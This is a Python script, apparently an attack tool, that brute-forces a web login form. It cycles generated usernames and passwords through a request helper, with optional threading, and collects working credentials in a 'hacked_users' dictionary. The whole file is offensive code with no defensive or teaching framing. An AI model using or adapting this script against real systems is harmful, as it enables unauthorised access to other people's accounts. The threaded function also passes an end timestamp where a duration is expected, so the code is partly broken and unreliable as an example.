import time
from threading import Thread

from generators.bases import get_next_str as get_next_password
from generators.from_users_file import get_next_str as get_next_login
from requesters.forms_query import request

hacked_users = {}
attempts = 3

# login_state = 'state'
password_state = 'password'

def hack(seconds):
    end = time.time() + seconds
    step = 0
    password = ''
    while password is not None:
        login = ''
        while login is not None:
            for _ in range(attempts):
                if time.time() >= end:
                    return
                try:
                    if request(login, password):
                        print('Success: ', login, password)
                        hacked_users[login] = password
                    break
                except:
                    print('Error: ', login, password)
            login = get_next_login(password)

            step += 1
            if step % 1000 == 0:
                print(step, login, password)

        password = get_next_password(password_state)


def hack_threaded(threads, seconds):
    end = time.time() + seconds
    run_threads = []
    for t_id in range(threads):
        t = Thread(target=hack, args=(end,))
        t.start()
        run_threads.append(t)
        print('thread', t_id, 'run')
    for t in run_threads:
        t.join(timeout=seconds)
        print(t, 'stopped')


if __name__ == '__main__':
    hack(seconds=20000)
    print('Results ', hacked_users)
